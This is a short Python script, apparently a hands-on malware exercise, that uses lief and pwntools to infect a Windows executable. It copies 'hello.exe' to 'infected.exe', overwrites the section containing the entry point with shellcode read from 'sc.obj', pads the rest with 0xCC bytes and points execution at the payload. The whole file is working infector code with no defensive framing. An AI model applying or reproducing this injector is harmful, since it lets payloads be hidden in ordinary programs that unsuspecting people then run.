import lief
import shutil
from pwn import *


def byte2hex(bytestr):
    hexstr = ""
    for b in bytestr:
        hexstr += f"\\x{b:02x}"
    return hexstr


def hex2byte(hexstr):
    bytestr = hexstr.replace("\\x", "")
    bytestr = bytes.fromhex(bytestr)
    return bytestr


def inject(binary, sc):
    pe = lief.parse(binary)
    text = pe.section_from_rva(pe.optional_header.addressof_entrypoint)
    if text.size < len(sc):
        raise Exception(f"Shellcode is too long. Len: {len(sc)}")

    text.content = list(sc.ljust(text.size, b"\xcc"))
    pe.optional_header.addressof_entrypoint = text.virtual_address
    out = lief.PE.Builder(pe)
    out.build()
    out.write(binary)
    print(f"File {binary} was patched")


def read_file(filename, mode):
    with open(filename, mode) as file:
        content = file.read()
        return content


def main():
    file_obj = "sc.obj"
    old_file_exe = "hello.exe"
    file_exe = "infected.exe"
    shutil.copy(old_file_exe, file_exe)

    bytestr = read_file(file_obj, "rb")
    print(byte2hex(bytestr))
    print(len(bytestr))

    inject(file_exe, bytestr)


if __name__ == "__main__":
    main()
